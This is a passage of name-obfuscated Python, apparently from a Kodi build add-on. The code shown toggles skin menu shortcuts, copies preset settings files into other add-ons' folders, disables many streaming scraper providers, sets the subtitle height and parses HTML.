       pass #line:1170
def rdbuildaddonON ():#line:1177
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1179
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1180
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1181
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1199
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1202
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1203
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1207
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1208
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1209
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1227
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1230
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1231
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1235
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1236
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1237
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1255
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1258
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1259
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1263
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1264
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1265
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1283
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1286
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1287
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1290
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1291
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1292
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1310
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1313
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1314
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1316
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1317
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1318
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1336
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1339
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1340
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1342
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1343
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1344
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1362
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1365
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1366
    OOOOOO0O00O0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1369
    with open (OOOOOO0O00O0O0000 ,'r')as OO000OO000O0O0OO0 :#line:1370
      O0O0O000OOO0O0O00 =OO000OO000O0O0OO0 .read ()#line:1371
    O0O0O000OOO0O0O00 =O0O0O000OOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1389
    with open (OOOOOO0O00O0O0000 ,'w')as OO000OO000O0O0OO0 :#line:1392
      OO000OO000O0O0OO0 .write (O0O0O000OOO0O0O00 )#line:1393
def rdbuildinstallON ():#line:1396
    try :#line:1398
       O000O00000O0O0OOO =ADDONPATH +"/resources/rd/victory.xml"#line:1399
       O00OO0OOO00OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1400
       copyfile (O000O00000O0O0OOO ,O00OO0OOO00OO0OO0 )#line:1402
       O000O00000O0O0OOO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1404
       O00OO0OOO00OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1405
       copyfile (O000O00000O0O0OOO ,O00OO0OOO00OO0OO0 )#line:1407
       O000O00000O0O0OOO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1409
       O00OO0OOO00OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1410
       copyfile (O000O00000O0O0OOO ,O00OO0OOO00OO0OO0 )#line:1412
       O000O00000O0O0OOO =ADDONPATH +"/resources/rd/Splash.png"#line:1415
       O00OO0OOO00OO0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1416
       copyfile (O000O00000O0O0OOO ,O00OO0OOO00OO0OO0 )#line:1418
    except :#line:1420
       pass #line:1421
def rdbuild ():#line:1431
	OOO0000O0O00OO0OO =(ADDON .getSetting ("auto_rd"))#line:1432
	if OOO0000O0O00OO0OO =='true':#line:1433
		OOOO0000O0OO0OOOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1434
		OOOO0000O0OO0OOOO .setSetting ('all_t','0')#line:1435
		OOOO0000O0OO0OOOO .setSetting ('rd_menu_enable','false')#line:1436
		OOOO0000O0OO0OOOO .setSetting ('magnet_bay','false')#line:1437
		OOOO0000O0OO0OOOO .setSetting ('magnet_extra','false')#line:1438
		OOOO0000O0OO0OOOO .setSetting ('rd_only','false')#line:1439
		OOOO0000O0OO0OOOO .setSetting ('ftp','false')#line:1441
		OOOO0000O0OO0OOOO .setSetting ('fp','false')#line:1442
		OOOO0000O0OO0OOOO .setSetting ('filter_fp','false')#line:1443
		OOOO0000O0OO0OOOO .setSetting ('fp_size_en','false')#line:1444
		OOOO0000O0OO0OOOO .setSetting ('afdah','false')#line:1445
		OOOO0000O0OO0OOOO .setSetting ('ap2s','false')#line:1446
		OOOO0000O0OO0OOOO .setSetting ('cin','false')#line:1447
		OOOO0000O0OO0OOOO .setSetting ('clv','false')#line:1448
		OOOO0000O0OO0OOOO .setSetting ('cmv','false')#line:1449
		OOOO0000O0OO0OOOO .setSetting ('dl20','false')#line:1450
		OOOO0000O0OO0OOOO .setSetting ('esc','false')#line:1451
		OOOO0000O0OO0OOOO .setSetting ('extra','false')#line:1452
		OOOO0000O0OO0OOOO .setSetting ('film','false')#line:1453
		OOOO0000O0OO0OOOO .setSetting ('fre','false')#line:1454
		OOOO0000O0OO0OOOO .setSetting ('fxy','false')#line:1455
		OOOO0000O0OO0OOOO .setSetting ('genv','false')#line:1456
		OOOO0000O0OO0OOOO .setSetting ('getgo','false')#line:1457
		OOOO0000O0OO0OOOO .setSetting ('gold','false')#line:1458
		OOOO0000O0OO0OOOO .setSetting ('gona','false')#line:1459
		OOOO0000O0OO0OOOO .setSetting ('hdmm','false')#line:1460
		OOOO0000O0OO0OOOO .setSetting ('hdt','false')#line:1461
		OOOO0000O0OO0OOOO .setSetting ('icy','false')#line:1462
		OOOO0000O0OO0OOOO .setSetting ('ind','false')#line:1463
		OOOO0000O0OO0OOOO .setSetting ('iwi','false')#line:1464
		OOOO0000O0OO0OOOO .setSetting ('jen_free','false')#line:1465
		OOOO0000O0OO0OOOO .setSetting ('kiss','false')#line:1466
		OOOO0000O0OO0OOOO .setSetting ('lavin','false')#line:1467
		OOOO0000O0OO0OOOO .setSetting ('los','false')#line:1468
		OOOO0000O0OO0OOOO .setSetting ('m4u','false')#line:1469
		OOOO0000O0OO0OOOO .setSetting ('mesh','false')#line:1470
		OOOO0000O0OO0OOOO .setSetting ('mf','false')#line:1471
		OOOO0000O0OO0OOOO .setSetting ('mkvc','false')#line:1472
		OOOO0000O0OO0OOOO .setSetting ('mjy','false')#line:1473
		OOOO0000O0OO0OOOO .setSetting ('hdonline','false')#line:1474
		OOOO0000O0OO0OOOO .setSetting ('moviex','false')#line:1475
		OOOO0000O0OO0OOOO .setSetting ('mpr','false')#line:1476
		OOOO0000O0OO0OOOO .setSetting ('mvg','false')#line:1477
		OOOO0000O0OO0OOOO .setSetting ('mvl','false')#line:1478
		OOOO0000O0OO0OOOO .setSetting ('mvs','false')#line:1479
		OOOO0000O0OO0OOOO .setSetting ('myeg','false')#line:1480
		OOOO0000O0OO0OOOO .setSetting ('ninja','false')#line:1481
		OOOO0000O0OO0OOOO .setSetting ('odb','false')#line:1482
		OOOO0000O0OO0OOOO .setSetting ('ophd','false')#line:1483
		OOOO0000O0OO0OOOO .setSetting ('pks','false')#line:1484
		OOOO0000O0OO0OOOO .setSetting ('prf','false')#line:1485
		OOOO0000O0OO0OOOO .setSetting ('put18','false')#line:1486
		OOOO0000O0OO0OOOO .setSetting ('req','false')#line:1487
		OOOO0000O0OO0OOOO .setSetting ('rftv','false')#line:1488
		OOOO0000O0OO0OOOO .setSetting ('rltv','false')#line:1489
		OOOO0000O0OO0OOOO .setSetting ('sc','false')#line:1490
		OOOO0000O0OO0OOOO .setSetting ('seehd','false')#line:1491
		OOOO0000O0OO0OOOO .setSetting ('showbox','false')#line:1492
		OOOO0000O0OO0OOOO .setSetting ('shuid','false')#line:1493
		OOOO0000O0OO0OOOO .setSetting ('sil_gh','false')#line:1494
		OOOO0000O0OO0OOOO .setSetting ('spv','false')#line:1495
		OOOO0000O0OO0OOOO .setSetting ('subs','false')#line:1496
		OOOO0000O0OO0OOOO .setSetting ('tvs','false')#line:1497
		OOOO0000O0OO0OOOO .setSetting ('tw','false')#line:1498
		OOOO0000O0OO0OOOO .setSetting ('upto','false')#line:1499
		OOOO0000O0OO0OOOO .setSetting ('vel','false')#line:1500
		OOOO0000O0OO0OOOO .setSetting ('vex','false')#line:1501
		OOOO0000O0OO0OOOO .setSetting ('vidc','false')#line:1502
		OOOO0000O0OO0OOOO .setSetting ('w4hd','false')#line:1503
		OOOO0000O0OO0OOOO .setSetting ('wav','false')#line:1504
		OOOO0000O0OO0OOOO .setSetting ('wf','false')#line:1505
		OOOO0000O0OO0OOOO .setSetting ('wse','false')#line:1506
		OOOO0000O0OO0OOOO .setSetting ('wss','false')#line:1507
		OOOO0000O0OO0OOOO .setSetting ('wsse','false')#line:1508
		OOOO0000O0OO0OOOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1509
		OOOO0000O0OO0OOOO .setSetting ('debrid.only','true')#line:1510
		OOOO0000O0OO0OOOO .setSetting ('hosts.captcha','false')#line:1511
		OOOO0000O0OO0OOOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1512
		OOOO0000O0OO0OOOO .setSetting ('provider.123moviehd','false')#line:1513
		OOOO0000O0OO0OOOO .setSetting ('provider.300mbdownload','false')#line:1514
		OOOO0000O0OO0OOOO .setSetting ('provider.alltube','false')#line:1515
		OOOO0000O0OO0OOOO .setSetting ('provider.allucde','false')#line:1516
		OOOO0000O0OO0OOOO .setSetting ('provider.animebase','false')#line:1517
		OOOO0000O0OO0OOOO .setSetting ('provider.animeloads','false')#line:1518
		OOOO0000O0OO0OOOO .setSetting ('provider.animetoon','false')#line:1519
		OOOO0000O0OO0OOOO .setSetting ('provider.bnwmovies','false')#line:1520
		OOOO0000O0OO0OOOO .setSetting ('provider.boxfilm','false')#line:1521
		OOOO0000O0OO0OOOO .setSetting ('provider.bs','false')#line:1522
		OOOO0000O0OO0OOOO .setSetting ('provider.cartoonhd','false')#line:1523
		OOOO0000O0OO0OOOO .setSetting ('provider.cdahd','false')#line:1524
		OOOO0000O0OO0OOOO .setSetting ('provider.cdax','false')#line:1525
		OOOO0000O0OO0OOOO .setSetting ('provider.cine','false')#line:1526
		OOOO0000O0OO0OOOO .setSetting ('provider.cinenator','false')#line:1527
		OOOO0000O0OO0OOOO .setSetting ('provider.cmovieshdbz','false')#line:1528
		OOOO0000O0OO0OOOO .setSetting ('provider.coolmoviezone','false')#line:1529
		OOOO0000O0OO0OOOO .setSetting ('provider.ddl','false')#line:1530
		OOOO0000O0OO0OOOO .setSetting ('provider.deepmovie','false')#line:1531
		OOOO0000O0OO0OOOO .setSetting ('provider.ekinomaniak','false')#line:1532
		OOOO0000O0OO0OOOO .setSetting ('provider.ekinotv','false')#line:1533
		OOOO0000O0OO0OOOO .setSetting ('provider.filiser','false')#line:1534
		OOOO0000O0OO0OOOO .setSetting ('provider.filmpalast','false')#line:1535
		OOOO0000O0OO0OOOO .setSetting ('provider.filmwebbooster','false')#line:1536
		OOOO0000O0OO0OOOO .setSetting ('provider.filmxy','false')#line:1537
		OOOO0000O0OO0OOOO .setSetting ('provider.fmovies','false')#line:1538
		OOOO0000O0OO0OOOO .setSetting ('provider.foxx','false')#line:1539
		OOOO0000O0OO0OOOO .setSetting ('provider.freefmovies','false')#line:1540
		OOOO0000O0OO0OOOO .setSetting ('provider.freeputlocker','false')#line:1541
		OOOO0000O0OO0OOOO .setSetting ('provider.furk','false')#line:1542
		OOOO0000O0OO0OOOO .setSetting ('provider.gamatotv','false')#line:1543
		OOOO0000O0OO0OOOO .setSetting ('provider.gogoanime','false')#line:1544
		OOOO0000O0OO0OOOO .setSetting ('provider.gowatchseries','false')#line:1545
		OOOO0000O0OO0OOOO .setSetting ('provider.hackimdb','false')#line:1546
		OOOO0000O0OO0OOOO .setSetting ('provider.hdfilme','false')#line:1547
		OOOO0000O0OO0OOOO .setSetting ('provider.hdmto','false')#line:1548
		OOOO0000O0OO0OOOO .setSetting ('provider.hdpopcorns','false')#line:1549
		OOOO0000O0OO0OOOO .setSetting ('provider.hdstreams','false')#line:1550
		OOOO0000O0OO0OOOO .setSetting ('provider.horrorkino','false')#line:1552
		OOOO0000O0OO0OOOO .setSetting ('provider.iitv','false')#line:1553
		OOOO0000O0OO0OOOO .setSetting ('provider.iload','false')#line:1554
		OOOO0000O0OO0OOOO .setSetting ('provider.iwaatch','false')#line:1555
		OOOO0000O0OO0OOOO .setSetting ('provider.kinodogs','false')#line:1556
		OOOO0000O0OO0OOOO .setSetting ('provider.kinoking','false')#line:1557
		OOOO0000O0OO0OOOO .setSetting ('provider.kinow','false')#line:1558
		OOOO0000O0OO0OOOO .setSetting ('provider.kinox','false')#line:1559
		OOOO0000O0OO0OOOO .setSetting ('provider.lichtspielhaus','false')#line:1560
		OOOO0000O0OO0OOOO .setSetting ('provider.liomenoi','false')#line:1561
		OOOO0000O0OO0OOOO .setSetting ('provider.magnetdl','false')#line:1564
		OOOO0000O0OO0OOOO .setSetting ('provider.megapelistv','false')#line:1565
		OOOO0000O0OO0OOOO .setSetting ('provider.movie2k-ac','false')#line:1566
		OOOO0000O0OO0OOOO .setSetting ('provider.movie2k-ag','false')#line:1567
		OOOO0000O0OO0OOOO .setSetting ('provider.movie2z','false')#line:1568
		OOOO0000O0OO0OOOO .setSetting ('provider.movie4k','false')#line:1569
		OOOO0000O0OO0OOOO .setSetting ('provider.movie4kis','false')#line:1570
		OOOO0000O0OO0OOOO .setSetting ('provider.movieneo','false')#line:1571
		OOOO0000O0OO0OOOO .setSetting ('provider.moviesever','false')#line:1572
		OOOO0000O0OO0OOOO .setSetting ('provider.movietown','false')#line:1573
		OOOO0000O0OO0OOOO .setSetting ('provider.mvrls','false')#line:1575
		OOOO0000O0OO0OOOO .setSetting ('provider.netzkino','false')#line:1576
		OOOO0000O0OO0OOOO .setSetting ('provider.odb','false')#line:1577
		OOOO0000O0OO0OOOO .setSetting ('provider.openkatalog','false')#line:1578
		OOOO0000O0OO0OOOO .setSetting ('provider.ororo','false')#line:1579
		OOOO0000O0OO0OOOO .setSetting ('provider.paczamy','false')#line:1580
		OOOO0000O0OO0OOOO .setSetting ('provider.peliculasdk','false')#line:1581
		OOOO0000O0OO0OOOO .setSetting ('provider.pelisplustv','false')#line:1582
		OOOO0000O0OO0OOOO .setSetting ('provider.pepecine','false')#line:1583
		OOOO0000O0OO0OOOO .setSetting ('provider.primewire','false')#line:1584
		OOOO0000O0OO0OOOO .setSetting ('provider.projectfreetv','false')#line:1585
		OOOO0000O0OO0OOOO .setSetting ('provider.proxer','false')#line:1586
		OOOO0000O0OO0OOOO .setSetting ('provider.pureanime','false')#line:1587
		OOOO0000O0OO0OOOO .setSetting ('provider.putlocker','false')#line:1588
		OOOO0000O0OO0OOOO .setSetting ('provider.putlockerfree','false')#line:1589
		OOOO0000O0OO0OOOO .setSetting ('provider.reddit','false')#line:1590
		OOOO0000O0OO0OOOO .setSetting ('provider.cartoonwire','false')#line:1591
		OOOO0000O0OO0OOOO .setSetting ('provider.seehd','false')#line:1592
		OOOO0000O0OO0OOOO .setSetting ('provider.segos','false')#line:1593
		OOOO0000O0OO0OOOO .setSetting ('provider.serienstream','false')#line:1594
		OOOO0000O0OO0OOOO .setSetting ('provider.series9','false')#line:1595
		OOOO0000O0OO0OOOO .setSetting ('provider.seriesever','false')#line:1596
		OOOO0000O0OO0OOOO .setSetting ('provider.seriesonline','false')#line:1597
		OOOO0000O0OO0OOOO .setSetting ('provider.seriespapaya','false')#line:1598
		OOOO0000O0OO0OOOO .setSetting ('provider.sezonlukdizi','false')#line:1599
		OOOO0000O0OO0OOOO .setSetting ('provider.solarmovie','false')#line:1600
		OOOO0000O0OO0OOOO .setSetting ('provider.solarmoviez','false')#line:1601
		OOOO0000O0OO0OOOO .setSetting ('provider.stream-to','false')#line:1602
		OOOO0000O0OO0OOOO .setSetting ('provider.streamdream','false')#line:1603
		OOOO0000O0OO0OOOO .setSetting ('provider.streamflix','false')#line:1604
		OOOO0000O0OO0OOOO .setSetting ('provider.streamit','false')#line:1605
		OOOO0000O0OO0OOOO .setSetting ('provider.swatchseries','false')#line:1606
		OOOO0000O0OO0OOOO .setSetting ('provider.szukajkatv','false')#line:1607
		OOOO0000O0OO0OOOO .setSetting ('provider.tainiesonline','false')#line:1608
		OOOO0000O0OO0OOOO .setSetting ('provider.tainiomania','false')#line:1609
		OOOO0000O0OO0OOOO .setSetting ('provider.tata','false')#line:1612
		OOOO0000O0OO0OOOO .setSetting ('provider.trt','false')#line:1613
		OOOO0000O0OO0OOOO .setSetting ('provider.tvbox','false')#line:1614
		OOOO0000O0OO0OOOO .setSetting ('provider.ultrahd','false')#line:1615
		OOOO0000O0OO0OOOO .setSetting ('provider.video4k','false')#line:1616
		OOOO0000O0OO0OOOO .setSetting ('provider.vidics','false')#line:1617
		OOOO0000O0OO0OOOO .setSetting ('provider.view4u','false')#line:1618
		OOOO0000O0OO0OOOO .setSetting ('provider.watchseries','false')#line:1619
		OOOO0000O0OO0OOOO .setSetting ('provider.xrysoi','false')#line:1620
		OOOO0000O0OO0OOOO .setSetting ('provider.library','false')#line:1621
def fixfont ():#line:1624
	OOO00O0O00O0O0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1625
	O0O00O0OO00OO00OO =json .loads (OOO00O0O00O0O0OOO );#line:1627
	OOO000O0O0000000O =O0O00O0OO00OO00OO ["result"]["settings"]#line:1628
	OO0000O0O0OOOOOOO =[O0000OOOOOOOOOO0O for O0000OOOOOOOOOO0O in OOO000O0O0000000O if O0000OOOOOOOOOO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1630
	O0O00O0O000OO00O0 =OO0000O0O0OOOOOOO ["options"];#line:1631
	OOO0OOOO000000000 =OO0000O0O0OOOOOOO ["value"];#line:1632
	OO0000000OOOOOOO0 =[OO000OO0O0O0000O0 for (OO000OO0O0O0000O0 ,OO0O0O00OO0OOOO0O )in enumerate (O0O00O0O000OO00O0 )if OO0O0O00OO0OOOO0O ["value"]==OOO0OOOO000000000 ][0 ];#line:1634
	O0O0O0O00O0O0O00O =(OO0000000OOOOOOO0 +1 )%len (O0O00O0O000OO00O0 )#line:1636
	O0O0O00O000O00O00 =O0O00O0O000OO00O0 [O0O0O0O00O0O0O00O ]["value"]#line:1638
	OOOO0000O0OO0000O =O0O00O0O000OO00O0 [O0O0O0O00O0O0O00O ]["label"]#line:1639
	OOOO00O0OO0OO00OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1641
	try :#line:1643
		OO0000O0O0OO0O0OO =json .loads (OOOO00O0OO0OO00OO );#line:1644
		if OO0000O0O0OO0O0OO ["result"]!=True :#line:1646
			raise Exception #line:1647
	except :#line:1648
		sys .stderr .write ("Error switching audio output device")#line:1649
		raise Exception #line:1650
def parseDOM2 (O0O0O000OO00O00O0 ,name =u"",attrs ={},ret =False ):#line:1651
	if isinstance (O0O0O000OO00O00O0 ,str ):#line:1654
		try :#line:1655
			O0O0O000OO00O00O0 =[O0O0O000OO00O00O0 .decode ("utf-8")]#line:1656
		except :#line:1657
			O0O0O000OO00O00O0 =[O0O0O000OO00O00O0 ]#line:1658
	elif isinstance (O0O0O000OO00O00O0 ,unicode ):#line:1659
		O0O0O000OO00O00O0 =[O0O0O000OO00O00O0 ]#line:1660
	elif not isinstance (O0O0O000OO00O00O0 ,list ):#line:1661
		return u""#line:1662
	if not name .strip ():#line:1664
		return u""#line:1665
	O0O0OOO00OOOO0000 =[]#line:1667
	for O0000OOO0OOOOO0OO in O0O0O000OO00O00O0 :#line:1668
		OO00OO0OO0OO000OO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0000OOO0OOOOO0OO )#line:1669
		for OOOOOO000O00O000O in OO00OO0OO0OO000OO :#line:1670
			O0000OOO0OOOOO0OO =O0000OOO0OOOOO0OO .replace (OOOOOO000O00O000O ,OOOOOO000O00O000O .replace ("\n"," "))#line:1671
		OOO00O0OO0OO0O0O0 =[]#line:1673
		for OO00OOO0OOO00OO00 in attrs :#line:1674
			OOOO0OOO000OO0OO0 =re .compile ('(<'+name +'[^>]*?(?:'+OO00OOO0OOO00OO00 +'=[\'"]'+attrs [OO00OOO0OOO00OO00 ]+'[\'"].*?>))',re .M |re .S ).findall (O0000OOO0OOOOO0OO )#line:1675
			if len (OOOO0OOO000OO0OO0 )==0 and attrs [OO00OOO0OOO00OO00 ].find (" ")==-1 :#line:1676
				OOOO0OOO000OO0OO0 =re .compile ('(<'+name +'[^>]*?(?:'+OO00OOO0OOO00OO00 +'='+attrs [OO00OOO0OOO00OO00 ]+'.*?>))',re .M |re .S ).findall (O0000OOO0OOOOO0OO )#line:1677
			if len (OOO00O0OO0OO0O0O0 )==0 :#line:1679
				OOO00O0OO0OO0O0O0 =OOOO0OOO000OO0OO0 #line:1680
				OOOO0OOO000OO0OO0 =[]#line:1681
			else :#line:1682
				OOOOO0OOO00OOOO0O =range (len (OOO00O0OO0OO0O0O0 ))#line:1683
				OOOOO0OOO00OOOO0O .reverse ()#line:1684
				for OO0000000O0O00O0O in OOOOO0OOO00OOOO0O :#line:1685
					if not OOO00O0OO0OO0O0O0 [OO0000000O0O00O0O ]in OOOO0OOO000OO0OO0 :#line:1686
						del (OOO00O0OO0OO0O0O0 [OO0000000O0O00O0O ])#line:1687
		if len (OOO00O0OO0OO0O0O0 )==0 and attrs =={}:#line:1689
			OOO00O0OO0OO0O0O0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0000OOO0OOOOO0OO )#line:1690
			if len (OOO00O0OO0OO0O0O0 )==0 :#line:1691
